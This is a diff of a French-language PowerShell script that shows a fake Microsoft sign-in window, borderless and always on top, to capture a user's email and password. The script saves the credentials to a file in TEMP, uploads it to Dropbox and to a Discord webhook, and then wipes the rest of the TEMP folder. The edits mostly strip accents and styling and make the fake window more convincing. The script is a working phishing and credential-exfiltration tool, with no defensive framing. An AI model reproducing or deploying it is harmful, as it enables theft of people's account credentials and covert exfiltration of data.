@@ -1,4 +1,4 @@
-# Définis ça au TOUT DÉBUT du script
+# Debut du script1
 $FileName = "credentials.txt"
 $filePath = "$env:TEMP\$FileName"
 
@@ -14,12 +14,12 @@ function Get-Creds {
         Width="600" Height="700"
         Topmost="True"
         Background="#1F1F1F"
-        WindowStyle="SingleBorderWindow"
+        WindowStyle="None"
         Foreground="White">
     <Grid Background="#1F1F1F">
         <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="500">
             <!-- Logo Microsoft -->
-            <StackPanel Orientation="Horizontal" Height="60" Margin="0,0,0,40" VerticalAlignment="Center">
+            <StackPanel Orientation="Horizontal" Height="50" Margin="0,0,0,40" VerticalAlignment="Center">
                 <Rectangle Width="15" Height="15" Fill="#F25022" Margin="0,0,5,0"/>
                 <Rectangle Width="15" Height="15" Fill="#7FBA00" Margin="0,0,5,0"/>
                 <Rectangle Width="15" Height="15" Fill="#00A4EF" Margin="0,0,5,0"/>
@@ -34,7 +34,7 @@ function Get-Creds {
             <TextBlock Text="Utilisez votre compte Microsoft." FontSize="15" Foreground="#C0C0C0" Margin="0,0,0,35"/>
             
             <!-- Email/Username -->
-            <TextBlock Text="Adresse e-mail ou numéro de téléphone" FontSize="13" Foreground="#C0C0C0" Margin="0,0,0,10"/>
+            <TextBlock Text="Adresse e-mail ou numero de telephone" FontSize="13" Foreground="#C0C0C0" Margin="0,0,0,10"/>
             <TextBox x:Name="UsernameBox" 
                      Padding="12" 
                      Height="40" 
@@ -43,17 +43,11 @@ function Get-Creds {
                      Foreground="White"
                      BorderThickness="1"
                      BorderBrush="#0078D4"
-                     FontSize="13">
-                <TextBox.Resources>
-                    <Style TargetType="TextBox">
-                        <Setter Property="CaretBrush" Value="White"/>
-                    </Style>
-                </TextBox.Resources>
-            </TextBox>
+                     FontSize="13"/>
             
-            <!-- Lien "Oublié nom d'utilisateur" -->
+            <!-- Lien Oublie -->
             <TextBlock TextAlignment="Left" Margin="0,0,0,25">
-                <Hyperlink x:Name="ForgotLink" Foreground="#0078D4" Cursor="Hand" TextDecorations="None">Vous avez oublié votre nom d'utilisateur ?</Hyperlink>
+                <Hyperlink x:Name="ForgotLink" Foreground="#0078D4" Cursor="Hand" TextDecorations="None">Vous avez oublie votre nom d'utilisateur ?</Hyperlink>
             </TextBlock>
             
             <!-- Mot de passe -->
@@ -66,13 +60,7 @@ function Get-Creds {
                          Foreground="White"
                          BorderThickness="1"
                          BorderBrush="#0078D4"
-                         FontSize="13">
-                <PasswordBox.Resources>
-                    <Style TargetType="PasswordBox">
-                        <Setter Property="CaretBrush" Value="White"/>
-                    </Style>
-                </PasswordBox.Resources>
-            </PasswordBox>
+                         FontSize="13"/>
             
             <!-- Message erreur -->
             <TextBlock x:Name="ErrorMessage" Text="" FontSize="12" Foreground="#E81123" Margin="0,0,0,20" TextWrapping="Wrap"/>
@@ -87,22 +75,12 @@ function Get-Creds {
                     FontSize="15"
                     FontWeight="SemiBold"
                     Cursor="Hand"
-                    BorderThickness="0">
-                <Button.Resources>
-                    <Style TargetType="Button">
-                        <Style.Triggers>
-                            <Trigger Property="IsMouseOver" Value="True">
-                                <Setter Property="Background" Value="#1084D7"/>
-                            </Trigger>
-                        </Style.Triggers>
-                    </Style>
-                </Button.Resources>
-            </Button>
+                    BorderThickness="0"/>
             
-            <!-- Lien Créer compte -->
+            <!-- Lien Creer compte -->
             <TextBlock TextAlignment="Center" Margin="0,0,0,0">
-                <Run Text="Vous débutez avec Microsoft ? " Foreground="#C0C0C0"/>
-                <Hyperlink x:Name="SignUpLink" Foreground="#0078D4" Cursor="Hand" TextDecorations="None">Créer un compte</Hyperlink>
+                <Run Text="Vous debutez avec Microsoft ? " Foreground="#C0C0C0"/>
+                <Hyperlink x:Name="SignUpLink" Foreground="#0078D4" Cursor="Hand" TextDecorations="None">Creer un compte</Hyperlink>
             </TextBlock>
         </StackPanel>
     </Grid>
@@ -184,14 +162,9 @@ if ($creds -eq $null) {
 Write-Host "Username: $($creds.Username)" -ForegroundColor Yellow
 Write-Host "Password: $($creds.Password)" -ForegroundColor Yellow
 
-#----------------------------------------------------------------------------------------------------
-# SAUVEGARDE DANS TEMP
-
 $credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
 $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
-Write-Host "Fichier sauvegardé: $filePath" -ForegroundColor Green
-
-#----------------------------------------------------------------------------------------------------
+Write-Host "Fichier sauvegarde: $filePath" -ForegroundColor Green
 
 function DropBox-Upload {
 [CmdletBinding()]
@@ -209,8 +182,6 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 
 if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $filePath}
 
-#----------------------------------------------------------------------------------------------------
-
 function Upload-Discord {
 [CmdletBinding()]
 param ([parameter(Position=0,Mandatory=$False)][string]$file,[parameter(Position=1,Mandatory=$False)][string]$text)
@@ -221,9 +192,6 @@ if (-not ([string]::IsNullOrEmpty($file))){ curl.exe -F "file1=@$file" $hookurl 
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $filePath}
-
-#----------------------------------------------------------------------------------------------------
-# NETTOYAGE - SANS SUPPRIMER credentials.txt
 
 Get-ChildItem $env:TEMP -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -ne "credentials.txt" } | Remove-Item -Force -ErrorAction SilentlyContinue -Recurse
 
